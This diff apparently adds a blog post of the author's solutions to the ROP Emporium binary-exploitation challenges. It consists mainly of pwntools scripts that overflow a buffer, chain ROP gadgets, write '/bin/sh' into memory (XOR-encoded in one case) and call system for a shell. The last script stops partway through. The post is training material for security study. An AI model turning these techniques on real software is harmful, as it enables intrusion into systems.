@@ -1,0 +1,492 @@
+I"��<h1 id="introduction">Introduction</h1>
+<p>Here are the solutions of the <a href="https://ropemporium.com/">ROP Emporium</a> challenges made by Max Kamper, he is extremely knowledgeable about binary exploitation, and has the ability to to easily teach advanced topics divided into digestible fast “chunks”, check him out!</p>
+
+<p>The challenges were great to train with, managed to do 7/8 for the x64, had to read some writeups for pivot one, once again, did not properly document my thought process, but still it might be usefull for some people looking for original solutions, will maybe improve them over time, I hope you like them in the meantime, for the x86 ones, they are practically the same, the size of the registers and calling convention are the only difference I presume.</p>
+
+<h1 id="ret2win">ret2win</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./ret2win'</span>
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">ret2win</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400811</span><span class="p">)</span>
+<span class="n">padding</span><span class="o">=</span><span class="mi">40</span><span class="o">*</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">padding</span><span class="o">+</span><span class="n">ret2win</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="split">split</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">i</span><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./split'</span>
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">uf</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400807</span><span class="p">)</span>
+<span class="n">padding</span><span class="o">=</span><span class="mi">40</span><span class="o">*</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+
+<span class="n">system</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span> <span class="mh">0x0000000000400810</span><span class="p">)</span>
+<span class="n">cat_flag</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00601060</span><span class="p">)</span>
+<span class="n">pop_rdi</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400883</span><span class="p">)</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">padding</span><span class="o">+</span><span class="n">pop_rdi</span><span class="o">+</span><span class="n">cat_flag</span><span class="o">+</span><span class="n">system</span><span class="p">)</span><span class="c1">#+uf)
+</span><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h1 id="callme">callme</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./callme'</span>
+
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span><span class="o">=</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">call_1</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401850</span><span class="p">)</span>
+<span class="n">call_2</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401870</span><span class="p">)</span>
+<span class="n">call_3</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401810</span><span class="p">)</span>
+
+<span class="c1">#0x0000000000401ab0: pop rdi; pop rsi; pop rdx; ret;
+</span><span class="n">pop_rdi_rsi_rdx</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401ab0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span>  <span class="n">padding</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">pop_rdi_rsi_rdx</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">call_1</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">pop_rdi_rsi_rdx</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">call_2</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">pop_rdi_rsi_rdx</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span><span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3</span><span class="p">)</span><span class="o">+</span><span class="n">call_3</span>
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<h1 id="write4">write4</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./write4'</span>
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+<span class="n">dbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1"># Gadgets
+#0x0000000000400820: mov qword ptr [r14], r15; ret; 
+#0x0000000000400890: pop r14; pop r15; ret;
+#0x0000000000400893: pop rdi; ret; 
+</span>
+<span class="k">def</span> <span class="nf">WriteMem</span><span class="p">(</span><span class="n">Where</span><span class="p">,</span><span class="n">What</span><span class="p">):</span>
+    <span class="n">mov_15_to_PTR14</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400820</span><span class="p">)</span>
+    <span class="n">pop_14_15</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400890</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">What</span><span class="p">,</span><span class="n">pop_14_15</span><span class="p">)</span>
+    <span class="n">payload</span><span class="o">=</span><span class="n">pop_14_15</span><span class="o">+</span><span class="n">Where</span><span class="o">+</span><span class="n">What</span><span class="o">+</span><span class="n">mov_15_to_PTR14</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="n">padding</span><span class="o">=</span> <span class="mi">40</span><span class="o">*</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">uf</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400807</span><span class="p">)</span>
+<span class="n">system</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400810</span><span class="p">)</span>
+<span class="n">writable</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x601050</span><span class="p">)</span>
+<span class="n">pop_rdi</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400893</span><span class="p">)</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">WriteMem</span><span class="p">(</span>  <span class="n">writable</span>  <span class="p">,</span>  <span class="n">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span> <span class="p">)</span>  
+<span class="n">payload</span><span class="o">+=</span> <span class="n">pop_rdi</span><span class="o">+</span> <span class="n">writable</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">system</span>
+<span class="c1">#payload+=  WriteMem(  writable2  , b'/sh\x00' )  
+</span><span class="n">payload</span><span class="o">+=</span><span class="n">uf</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"payload"</span><span class="p">,</span><span class="s">"wb"</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h1 id="badchars">badchars</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3 
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./badchars'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">dbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+
+<span class="c1"># Gadgets
+#0x0000000000400b3b: pop r12; pop r13; ret;
+#0x0000000000400b34: mov qword ptr [r13], r12; ret; 
+</span>
+<span class="c1">#0x0000000000400b40: pop r14; pop r15; ret;
+#0x0000000000400b30: xor byte ptr [r15], r14b; ret;
+</span>
+<span class="c1">#0x0000000000400b39: pop rdi; ret;
+</span>
+<span class="c1">#0x00000000004008ee: mov eax, 0; pop rbp; ret; 
+</span>
+<span class="n">badchars</span><span class="o">=</span>  <span class="p">[</span><span class="n">b</span><span class="s">'b'</span><span class="p">,</span><span class="n">b</span><span class="s">'i'</span><span class="p">,</span><span class="n">b</span><span class="s">'c'</span><span class="p">,</span> <span class="n">b</span><span class="s">'/'</span><span class="p">,</span> <span class="n">b</span><span class="s">' '</span><span class="p">,</span> <span class="n">b</span><span class="s">'f'</span><span class="p">,</span> <span class="n">b</span><span class="s">'n'</span><span class="p">,</span> <span class="n">b</span><span class="s">'s'</span><span class="p">]</span>
+<span class="n">cmd</span><span class="o">=</span><span class="n">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span>
+<span class="n">offset</span><span class="o">=</span><span class="mi">15</span>
+<span class="n">data_sec</span><span class="o">=</span><span class="mh">0x601070</span> <span class="o">+</span> <span class="n">offset</span>
+<span class="n">data</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">data_sec</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">WriteMem</span><span class="p">(</span><span class="n">Where</span><span class="p">,</span><span class="n">What</span><span class="p">):</span>
+    <span class="n">pop_12_13</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400b3b</span><span class="p">)</span>
+    <span class="n">mov_12_in_pt13</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400b34</span><span class="p">)</span>
+    <span class="n">payload</span><span class="o">=</span><span class="n">pop_12_13</span><span class="o">+</span><span class="n">What</span><span class="o">+</span><span class="n">Where</span><span class="o">+</span><span class="n">mov_12_in_pt13</span>
+    <span class="k">return</span> <span class="n">payload</span>
+<span class="k">def</span> <span class="nf">XorByte</span><span class="p">(</span><span class="n">Where</span><span class="p">,</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">pop_14_15</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400b40</span><span class="p">)</span>
+    <span class="n">xor_14_ptr15</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400b30</span><span class="p">)</span>
+    <span class="n">payload</span><span class="o">=</span><span class="n">pop_14_15</span><span class="o">+</span><span class="n">key</span><span class="o">+</span><span class="n">Where</span><span class="o">+</span><span class="n">xor_14_ptr15</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="n">xored_cmd</span><span class="o">=</span><span class="n">badchars</span>
+
+<span class="n">key</span><span class="o">=</span><span class="mi">0</span>
+<span class="c1"># Be sure xored_cmd do not contain badchars, else increment key.
+</span><span class="k">while</span> <span class="nb">len</span><span class="p">([</span><span class="n">e</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">badchars</span> <span class="k">if</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">xored_cmd</span><span class="p">])</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+    <span class="n">key</span><span class="o">+=</span><span class="mi">1</span>
+    <span class="n">xored_cmd</span><span class="o">=</span><span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">((</span><span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span> <span class="n">xored_cmd</span><span class="p">,</span><span class="n">key</span><span class="p">)</span>
+
+<span class="n">padding</span><span class="o">=</span><span class="s">'A'</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">*</span><span class="mi">40</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">padding</span>
+
+<span class="c1">## Write xored_cmd in data section
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">WriteMem</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">xored_cmd</span><span class="p">)</span>
+
+<span class="c1">### Xor payload in data section
+</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span> 
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">XorByte</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">data_sec</span><span class="o">+</span><span class="n">i</span><span class="p">),</span><span class="n">p64</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
+
+<span class="c1">### Pop clear cmd into rdi and call system
+</span><span class="n">pop_rdi</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400b39</span><span class="p">)</span>
+<span class="n">call_system</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4009e8</span><span class="p">)</span>
+<span class="c1">#libc_system=p64(0x00007ffff7e3eed0)
+</span><span class="n">system</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006F0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi</span><span class="o">+</span><span class="n">data</span><span class="o">+</span><span class="n">system</span>
+
+
+<span class="n">uf</span> <span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004009df</span><span class="p">)</span>
+<span class="c1">#payload += uf
+</span><span class="nb">exit</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400770</span><span class="p">)</span>
+<span class="n">mov_eax_0</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x4008ee</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">mov_eax_0</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="nb">exit</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">f</span><span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'payload'</span><span class="p">,</span><span class="s">'wb'</span><span class="p">)</span>
+<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+<h1 id="fluff">fluff</h1>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'i386'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./fluff'</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+
+<span class="c1"># Gadgets
+#0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
+#Dump of assembler code for function questionableGadgets:
+</span>                                    <span class="c1"># Control r15,r14, set r11 zero
+</span>   <span class="c1">#0x0000000000400820 &lt;+0&gt;:   pop    r15
+</span>   <span class="c1">#0x0000000000400822 &lt;+2&gt;:   xor    r11,r11 
+</span>   <span class="c1">#0x0000000000400825 &lt;+5&gt;:   pop    r14
+</span>   <span class="c1">#0x0000000000400827 &lt;+7&gt;:   mov    edi,0x601050
+</span>   <span class="c1">#0x000000000040082c &lt;+12&gt;:  ret
+</span>
+                                    <span class="c1"># Control r14 r12
+</span>   <span class="c1">#0x000000000040082d &lt;+13&gt;:  pop    r14
+</span>   <span class="c1">#0x000000000040082f &lt;+15&gt;:  xor    r11,r12
+</span>   <span class="c1">#0x0000000000400832 &lt;+18&gt;:  pop    r12
+</span>   <span class="c1">#0x0000000000400834 &lt;+20&gt;:  mov    r13d,0x604060
+</span>   <span class="c1">#0x000000000040083a &lt;+26&gt;:  ret
+</span>                                    <span class="c1"># Control r15 swap 11 10
+</span>   <span class="c1">#0x000000000040083b &lt;+27&gt;:  mov    edi,0x601050
+</span>   <span class="c1">#0x0000000000400840 &lt;+32&gt;:  xchg   r11,r10     Swap content r11 r10
+</span>   <span class="c1">#0x0000000000400843 &lt;+35&gt;:  pop    r15 
+</span>   <span class="c1">#0x0000000000400845 &lt;+37&gt;:  mov    r11d,0x602050
+</span>   <span class="c1">#0x000000000040084b &lt;+43&gt;:  ret
+</span>                                    
+                                   <span class="c1"># control r15, r13,r12, write to r10 with r11
+</span>   <span class="c1">#0x000000000040084c &lt;+44&gt;:  pop    r15
+</span>   <span class="c1">#0x000000000040084e &lt;+46&gt;:  mov    QWORD PTR [r10],r11
+</span>   <span class="c1">#0x0000000000400851 &lt;+49&gt;:  pop    r13
+</span>   <span class="c1">#0x0000000000400853 &lt;+51&gt;:  pop    r12
+</span>   <span class="c1">#0x0000000000400855 &lt;+53&gt;:  xor    BYTE PTR [r10],r12b
+</span>   <span class="c1">#0x0000000000400858 &lt;+56&gt;:  ret
+</span>   <span class="c1">#0x0000000000400859 &lt;+57&gt;:  nop    DWORD PTR [rax+0x0]
+##End of assembler dump.
+#0x0000000000400719: add ebx, esi; ret;
+#0x00000000004005b6: add esp, 8; ret;
+#0x00000000004005b5: add rsp, 8; ret;
+#0x00000000004008cf: add bl, dh; ret;
+#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
+</span>
+<span class="c1">#Control over 15,14,13,12   r11=O  *r10=r11  *r10=r12
+</span>
+<span class="c1"># swap r11 r10, xor r11,r12
+#0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
+#0x0000000000400840 &lt;+32&gt;:  xchg   r11,r10     Swap content r11 r10
+# so can control r10 and r11
+#0x000000000040084e &lt;+46&gt;:  mov    QWORD PTR [r10],r11
+# Finally can write to memory /bin/sh and call system
+</span>
+
+
+
+<span class="n">cmd</span><span class="o">=</span><span class="n">b</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span>
+<span class="k">def</span> <span class="nf">setR12</span><span class="p">(</span><span class="n">value</span><span class="p">):</span> <span class="c1"># Modif r13
+</span>    <span class="n">pop_12</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400832</span><span class="p">)</span>
+<span class="c1">#0x0000000000400832: pop r12; mov r13d, 0x604060; ret;
+</span>    <span class="n">buff</span><span class="o">=</span><span class="n">pop_12</span>
+    <span class="k">if</span> <span class="n">value</span><span class="o">!=</span><span class="n">cmd</span><span class="p">:</span> <span class="c1"># Check if its cmd, dont p64 again .
+</span>        <span class="n">buff</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+    <span class="k">else</span> <span class="p">:</span>
+        <span class="n">buff</span><span class="o">+=</span><span class="n">value</span>
+    <span class="k">return</span>  <span class="n">buff</span>
+
+<span class="k">def</span> <span class="nf">setR11</span><span class="p">(</span><span class="n">value11</span><span class="p">):</span> <span class="c1">#Modif r14 edi, r12 r13d
+</span>    <span class="n">xor_11_11</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400822</span><span class="p">)</span>
+    <span class="n">xor_11_12</span><span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40082f</span><span class="p">)</span>
+<span class="c1">#0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
+</span>    <span class="n">buff</span><span class="o">=</span> <span class="n">xor_11_11</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">buff</span><span class="o">+=</span> <span class="n">setR12</span><span class="p">(</span><span class="n">value11</span><span class="p">)</span>
